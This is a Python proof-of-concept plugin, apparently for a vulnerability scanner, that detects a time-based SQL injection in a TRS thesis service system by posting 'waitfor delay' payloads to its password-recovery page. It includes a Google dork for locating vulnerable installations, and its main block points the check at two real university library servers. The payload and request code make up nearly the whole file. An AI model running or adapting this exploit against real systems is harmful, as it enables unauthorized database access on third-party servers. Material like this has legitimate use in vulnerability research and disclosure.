#!usr/bin/env python
# *-* coding:utf-8 *-*

'''
name: TRS学位论文系统一处SQL注入
author: yichin
refer: http://www.wooyun.org/bugs/wooyun-2010-0124453
description:
    google dork: intitle:"学位论文服务系统"
    paper/forget2.jsp POST
'''
import time

def assign(service, arg):
    if service == 'trs_lunwen':
        return True, arg

def audit(arg):
    url = arg + 'paper/forget2.jsp'
    delay_0 = 'code=test%27;waitfor%20delay%20%270:0:0%27--&r_code=%D1%A7%BA%C5%B2%BB%C4%DC%CE%AA%BF%D5'
    delay_5 = 'code=test%27;waitfor%20delay%20%270:0:5%27--&r_code=%D1%A7%BA%C5%B2%BB%C4%DC%CE%AA%BF%D5'
    code, head, res, err, _ = curl.curl2(arg + 'papercon')  #获取cookie,不然要302
    content_type = 'Content-Type: application/x-www-form-urlencoded'
    t1 = time.time()
    code, head, res, err, _ = curl.curl2(url, post=delay_0, header=content_type)
    #print code, head
    if code != 200:
        return False
    t2 = time.time()
    code, head, res, err, _ = curl.curl2(url, post=delay_5, header=content_type)
    if code != 200:
        return False
    t3 = time.time()
    # debug("t0:" + str(t2-t1) + " t5:" + str(t3-t2))
    if(t1 + t3 - 2*t2) > 3:
        security_hole("SQL Injection: " + url + " POST:" +delay_5)
        
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('trs_lunwen', 'http://epaper.lib.bnu.edu.cn:8080/')[1])
    audit(assign('trs_lunwen', 'http://thesis.lib.tsinghua.edu.cn:8001/')[1])